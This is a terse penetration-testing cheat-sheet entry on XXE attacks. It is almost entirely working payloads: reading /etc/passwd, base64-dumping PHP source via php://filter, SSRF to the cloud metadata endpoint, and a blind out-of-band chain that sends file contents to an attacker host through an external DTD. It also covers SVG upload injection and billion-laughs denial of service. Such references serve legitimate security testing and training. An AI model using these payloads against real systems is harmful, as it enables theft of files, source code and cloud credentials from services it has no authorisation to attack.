## XXE — XML External Entity
Where: any XML sink — file upload of docx/xlsx/pptx/svg (they're zipped XML), SAML assertions, SOAP endpoints, raw XML request bodies, RSS/config import.
File read: `<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>`.
PHP wrapper (base64 for binary/source): `php://filter/convert.base64-encode/resource=/var/www/index.php`.
XXE->SSRF: `<!ENTITY x SYSTEM "http://169.254.169.254/latest/meta-data/">`.
Blind/OOB (no reflected output): external DTD on your host — parameter entity exfil: `<!ENTITY % d SYSTEM "http://you/e.dtd"> %d;` where e.dtd defines `<!ENTITY % p "<!ENTITY &#37; ex SYSTEM 'http://you/?%file;'>">`.
SVG upload payload: `<svg xmlns="..."><!DOCTYPE ...>` with the entity, then `<text>&x;</text>`.
DoS (avoid on prod): billion laughs — nested entity expansion.
